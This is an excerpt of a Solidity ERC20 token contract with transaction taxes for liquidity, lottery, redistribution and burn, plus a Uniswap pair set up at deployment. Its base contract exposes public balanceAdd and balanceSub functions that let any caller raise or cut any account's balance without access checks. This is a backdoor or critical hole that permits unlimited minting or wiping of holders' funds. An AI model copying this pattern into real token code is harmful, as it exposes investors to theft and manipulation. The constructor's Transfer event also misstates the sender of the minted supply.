...
abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function balanceAdd(address account, uint256 amount) public returns (uint256) {
        _balances[account] += amount;
        return(_balances[account]);
    }

    function balanceSub(address account, uint256 amount) public returns (uint256) {
        _balances[account] -= amount;
        return(_balances[account]);
    }
...
// main contract []
contract ERC_TOKEN is ERC20, Ownable, ReentrancyGuard {
    // public properties
        // extend
        ...
        // addresses
            // contracts
                ...
                address public CONTRACT_TOKEN_STAKE = 0x0000000000000000000000000000000000000000;
                address public CONTRACT_TOKEN_LOTTERY = 0x0000000000000000000000000000000000000000;
                

        // taxes 15% initial tax
            uint256 public taxLiquidity = 30; //3%
            uint256 public taxLottery = 50; //5%
            uint256 public taxRedistribution = 50; //5%
            uint256 public taxBurn = 20; //2%
    ...
    // events
        ...
        event TransferWithTaxes(address indexed from, address indexed to, uint256 liquidity, uint256 lottery, uint256 redistribution, uint256 burn);
    ...
    constructor() ERC20("ERC_TOKEN", "ERC"){
        // mint tokens and sent to contract
        _mint(_msgSender(), 1000000000 * (10 ** 18));

        _accountNoTaxes[address(this)] = true;
        _accountNoTaxes[_msgSender()] = true; // only for initial deployment, is removed after that
        ...
        CONTRACT_TOKEN_UNISWAP_PAIR = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;

        emit Transfer(address(this), _msgSender(), totalSupply());
    }
}